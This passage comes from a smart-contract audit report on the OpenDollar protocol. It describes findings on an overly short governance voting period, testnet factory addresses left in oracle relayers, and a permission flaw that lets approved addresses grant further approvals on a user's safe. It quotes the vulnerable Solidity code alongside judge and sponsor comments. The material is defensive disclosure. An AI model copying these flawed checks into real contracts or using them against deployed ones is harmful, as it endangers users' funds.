id=\"proof-of-concept-10\" style=\"position:relative;\"><a href=\"#proof-of-concept-10\" aria-label=\"proof of concept 10 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>The problem lies in the <code>votingDelay</code> and <code>votingPeriod</code> that are set in the ODGovernor.sol this way.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"34\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">contract ODGovernor is</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  Governor,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  GovernorSettings,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  GovernorCompatibilityBravo,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  GovernorVotes,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  GovernorVotesQuorumFraction,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  GovernorTimelockControl</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">{</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">...</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">constructor(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    address _token,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    TimelockController _timelock</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  )</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    Governor(&#39;ODGovernor&#39;)//@audit larger voting delay gives users the time to unstake tokens if necessary.</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    GovernorSettings(1, 15, 0)//@audit voting period 15blocks too small and no function to update. quorum will never be reached.</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    GovernorVotes(IVotes(_token))</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    GovernorVotesQuorumFraction(3)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    GovernorTimelockControl(_timelock)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  {}//@audit votingPeriod: how long does a proposal remain open to votes.</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">...</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span></code></pre>\n<p>In the constructor above the GovernorSettings constructor is used to set the votingDelay and votingPeriod.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"35\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">GovernorSettings</span><span class=\"mtk1\">(</span><span class=\"mtk12\">initialVotingDelay</span><span class=\"mtk1\">, </span><span class=\"mtk12\">initialVotingPeriod</span><span class=\"mtk1\">, </span><span class=\"mtk12\">initialProposalThreshold</span><span class=\"mtk1\">) </span><span class=\"mtk12\">measured</span><span class=\"mtk1\"> </span><span class=\"mtk4\">in</span><span class=\"mtk1\"> </span><span class=\"mtk12\">blocks</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">GovernorSettings</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">, </span><span class=\"mtk7\">15</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">)</span></span></span></code></pre>\n<p>The voting delay and voting period are measured in blocks. Since this project is built `specifically for Arbitrum, we will consider Arbitrum particularly to set this values.</p>\n<ul>\n<li>The average <code>blocktime</code> on <code>arbitrum</code> is <code>0.26 seconds</code>.</li>\n<li>so setting 1 voting delay in the code above implies that there is just 0.26 seconds delay from proposal to voting start time.</li>\n<li>And setting <code>15</code> voting period above implies that users have just 15 * 0.26 = <code>3.9 seconds</code> to cast their vote.</li>\n</ul>\n<p>It will be more practical to set atleast 1 day voting delay and atleast 1 week voting period as set in OZ governance examples.<br>\nTo convert these times to blocks on Arbitrum based on 0.26 secs avg blocktime:<br>\n1 day = 86400 / 0.26 = ~332, 308 blocks per day<br>\nSo 1 week will be 332, 308 * 7 = 2,326,156 blocks per week.</p>\n<p>So it will be more practical for GovernorSettings parameters to be set this way:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"36\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">//votingDelay = 1day and votingPeriod = 1week.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">GovernorSettings</span><span class=\"mtk1\">(</span><span class=\"mtk7\">332308</span><span class=\"mtk1\">, </span><span class=\"mtk7\">2326156</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">); </span><span class=\"mtk3\">//particulary for Arbitrum based on block numbers.</span></span></span></code></pre>\n<p>Calculation reference from OZ docs: <a href=\"https://docs.openzeppelin.com/contracts/4.x/governance#governor\">https://docs.openzeppelin.com/contracts/4.x/governance#governor</a></p>\n<p>In the inherited OZ’s Governor.sol, the voting delay and voting period are used to set each proposal’s voting start time and deadline in the propose function this way.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"37\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">function propose(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        address[] memory targets,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256[] memory values,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        bytes[] memory calldatas,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        string memory description</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    ) public virtual override returns (uint256) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">...</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"> ProposalCore storage proposal = _proposals[proposalId];</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"> require(proposal.voteStart.isUnset(), &quot;Governor: proposal already exists&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">uint64 snapshot = block.number.toUint64() + votingDelay().toUint64();//@audit voting delay.</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint64 deadline = snapshot + votingPeriod().toUint64();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        proposal.voteStart.setDeadline(snapshot);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        proposal.voteEnd.setDeadline(deadline);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">...</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span></code></pre>\n<h3 id=\"tools-used-4\" style=\"position:relative;\"><a href=\"#tools-used-4\" aria-label=\"tools used 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>Openzeppelin Governance docs, OZ’s smart contract wizard. </p>\n<p><a href=\"https://docs.openzeppelin.com/contracts/4.x/governance#governor\">https://docs.openzeppelin.com/contracts/4.x/governance#governor</a></p>\n<h3 id=\"recommended-mitigation-steps-11\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-11\" aria-label=\"recommended mitigation steps 11 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<ul>\n<li>Short term: Use Oz’s examples but do your calculations based on Arbitrum block time:</li>\n</ul>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"38\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">    GovernorSettings(332308, 2326156, 0); //particulary for Arbitrum based on block numbers.</span></span></code></pre>\n<p>OZ’s wizard example: <a href=\"https://wizard.openzeppelin.com/#governor\">https://wizard.openzeppelin.com/#governor</a></p>\n<ul>\n<li>Long term: Use latest Oz’s from 4.9 and above that have time based voting instead of block number. read here: <a href=\"https://docs.openzeppelin.com/contracts/4.x/governance#disclaimer\">https://docs.openzeppelin.com/contracts/4.x/governance#disclaimer</a></li>\n</ul>\n<p><strong><a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/202#issuecomment-1790189096\">MiloTruck (Judge) commented</a>:</strong></p>\n<blockquote>\n<p>The warden has demonstrated how the configured values for <code>GovernorSettings</code> are far too small for any effective governance to take place, since users only have ~4 seconds to cast votes. Therefore, all governor-related functionality in the <code>Vault721</code> contract will be unaccessible.</p>\n<p>Since this only impacts setter functions and does not affect the protocol’s core functionality, I believe medium severity is appropriate.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/202#issuecomment-1805209209\">pi0neerpat (OpenDollar) commented</a>:</strong></p>\n<blockquote>\n<p>The governance settings currently set are for testing, not production; however, finding is valid as this was not explicitly stated before the audit. Additionally, recommendation for both short and long-term solutions is appreciated.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-11-test-addresses-and-incorrect-interface-in-code-prevent-integration-with-uniswapv3-and-camelot\" style=\"position:relative;\"><a href=\"#m-11-test-addresses-and-incorrect-interface-in-code-prevent-integration-with-uniswapv3-and-camelot\" aria-label=\"m 11 test addresses and incorrect interface in code prevent integration with uniswapv3 and camelot permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/187\">[M-11] Test addresses and incorrect interface in code prevent integration with UniswapV3 and Camelot</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/187\">twicek</a>, also found by <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/444\">kutugu</a>, <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/442\">spark</a>, 0xMosh (<a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/401\">1</a>, <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/399\">2</a>), <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/397\">pep7siup</a>, <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/347\">0xhacksmithh</a>, <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/312\">ni8mare</a>, <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/292\">Arz</a>, <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/236\">btk</a>, <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/224\">bitsurfer</a>, and xAriextz (<a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/121\">1</a>, <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/119\">2</a>)</em></p>\n<p>Testing addresses for Camelot and UniswapV3 factories are still used in the code:</p>\n<p><a href=\"https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/oracles/CamelotRelayer.sol#L20\">CamelotRelayer.sol#L20</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"39\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk12\">constant</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_CAMELOT_FACTORY</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">GOERLI_CAMELOT_V3_FACTORY</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><a href=\"https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/oracles/UniV3Relayer.sol#L18\">UniV3Relayer.sol#L18</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"40\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk12\">constant</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_UNI_V3_FACTORY</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">GOERLI_UNISWAP_V3_FACTORY</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>Additionally, the correct interface to get the <code>camelotPair</code> is commented out:</p>\n<p><a href=\"https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/oracles/CamelotRelayer.sol#L41-L42\">CamelotRelayer.sol#L41-L42</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"41\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// camelotPair = ICamelotFactory(_CAMELOT_FACTORY).getPair(_baseToken, _quoteToken);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">camelotPair</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">IAlgebraFactory</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_CAMELOT_FACTORY</span><span class=\"mtk1\">).</span><span class=\"mtk11\">poolByPair</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_baseToken</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_quoteToken</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<h3 id=\"impact-3\" style=\"position:relative;\"><a href=\"#impact-3\" aria-label=\"impact 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>It will prevent integration with UniswapV3 and Camelot.</p>\n<h3 id=\"recommended-mitigation-steps-12\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-12\" aria-label=\"recommended mitigation steps 12 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Make the changes necessary to be compatible with Arbitrum One.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/187#issuecomment-1790139769\">MiloTruck (Judge) commented</a>:</strong></p>\n<blockquote>\n<p>While the protocol team is most likely aware of this and these addresses are probably set to testnet ones currently for testing purposes, it is an undeniable fact that if the current code was to be deployed without any modifications, the <code>CamelotRelayer</code> and <code>UniV3Relayer</code> contracts would not function as expected.</p>\n<p>As such, I believe medium severity is appropriate.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/187#issuecomment-1805211162\">pi0neerpat (OpenDollar) commented</a>:</strong></p>\n<blockquote>\n<p>The problem stated is that the Camelot and Uniswap factory addresses set in the Registry are set to Goerli addresses, not Mainnet. In production, we will swap Goerli addresses for Mainnet. Perhaps there is a better way to manage this than manually changing the constant variable in the Registry, however the recommendation does provide a helpful suggestion.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-12-approved-address-can-approve-other-addresses-for-an-owners-safe\" style=\"position:relative;\"><a href=\"#m-12-approved-address-can-approve-other-addresses-for-an-owners-safe\" aria-label=\"m 12 approved address can approve other addresses for an owners safe permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/171\">[M-12] Approved address can approve other addresses for an owner’s safe</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/171\">MrPotatoMagic</a>, also found by <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/451\">hals</a>, <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/396\">Tendency</a>, <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/373\">HChang26</a>, <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/252\">merlin</a>, <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/247\">COSMIC-BEE-REACH</a>, <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/219\">twcctop</a>, <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/211\">tnquanghuy0512</a>, <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/194\">Bughunter101</a>, <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/183\">josephdara</a>, <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/114\">Stormreckson</a>, <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/77\">T1MOH</a>, and <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/449\">klau5</a></em></p>\n<p>An owner of a safe can give permissions/approval of their safe to another address (let’s say address B) through the <a href=\"https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/proxies/ODSafeManager.sol#L105\">allowSafe() function</a> in the ODSafeManager.sol contract. But this other address (address B) also gets the power to approve other addresses for the owner’s safe. This is a permissioning problem in the <code>allowSafe()</code> function (specifically the <code>safeAllowed()</code> modifier) which creates a security risk for the owner’s safe.</p>\n<h3 id=\"proof-of-concept-11\" style=\"position:relative;\"><a href=\"#proof-of-concept-11\" aria-label=\"proof of concept 11 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Here is the whole process:</p>\n<p><a href=\"https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/proxies/ODSafeManager.sol#L105C1-L109C4\">https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/proxies/ODSafeManager.sol#L105C1-L109C4</a></p>\n<ol>\n<li>Owner of the safe gives permission/approval to <code>address _usr</code> (address 0x01 for example purposes) for <code>uint256 _safe</code> through the <code>allowSafe()</code> function.</li>\n<li>On Line 107, <code>safeCan[_owner][_safe][_usr] = _ok;</code> is set to any value other than 0 to represent approval.</li>\n</ol>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"42\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">ODSafeManager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">105</span><span class=\"mtk1\">:   </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">allowSAFE</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_safe</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_usr</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_ok</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">safeAllowed</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_safe</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">106</span><span class=\"mtk1\">:     </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_owner</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_safeData</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_safe</span><span class=\"mtk1\">].</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">107</span><span class=\"mtk1\">:     </span><span class=\"mtk12\">safeCan</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_owner</span><span class=\"mtk1\">][</span><span class=\"mtk12\">_safe</span><span class=\"mtk1\">][</span><span class=\"mtk12\">_usr</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">_ok</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">108</span><span class=\"mtk1\">:     </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">AllowSAFE</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_safe</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_usr</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_ok</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">109</span><span class=\"mtk1\">:   }</span></span></span></code></pre>\n<ol start=\"2\">\n<li>The previously set <code>address _usr</code> (address 0x01) can now call the <code>allowSafe()</code> function with parameters <code>uint256 _safe</code> which will be the owner’s safe and another <code>address _usr</code> (address 0x02), which will give address 0x02 permissions/approval for the owner’s safe.</li>\n<li>This issue arises because of how the checks are evaluated in the <a href=\"https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/proxies/ODSafeManager.sol#L49C1-L53C4\">safeAllowed() modifier</a>. Here is what happens:</li>\n<li>On Line 50, the owner of the safe is extracted.</li>\n<li>On Line 51, there are two conditions present that are separated by the &#x26;&#x26; operator.</li>\n<li>On Line 51, the first check evaluates to true, since the msg.sender (address 0x01) is not the owner of the safe</li>\n<li>On Line 51, the second check evaluates to false, since the msg.sender (address 0x01) was previously approved by the owner in step 1 above.</li>\n<li>Since true &#x26;&#x26; false = false, we do not revert and this gives address 0x02 permissions to the owner’s safe in the <code>allowSafe()</code> function.</li>\n</ol>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"43\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">ODSafeManager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">49</span><span class=\"mtk1\">:   </span><span class=\"mtk12\">modifier</span><span class=\"mtk1\"> </span><span class=\"mtk11\">safeAllowed</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_safe</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">50</span><span class=\"mtk1\">:     </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_owner</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_safeData</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_safe</span><span class=\"mtk1\">].</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">51</span><span class=\"mtk1\">:     </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\"> != </span><span class=\"mtk12\">_owner</span><span class=\"mtk1\"> &amp;&amp; </span><span class=\"mtk12\">safeCan</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_owner</span><span class=\"mtk1\">][</span><span class=\"mtk12\">_safe</span><span class=\"mtk1\">][</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">] == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">SafeNotAllowed</span><span 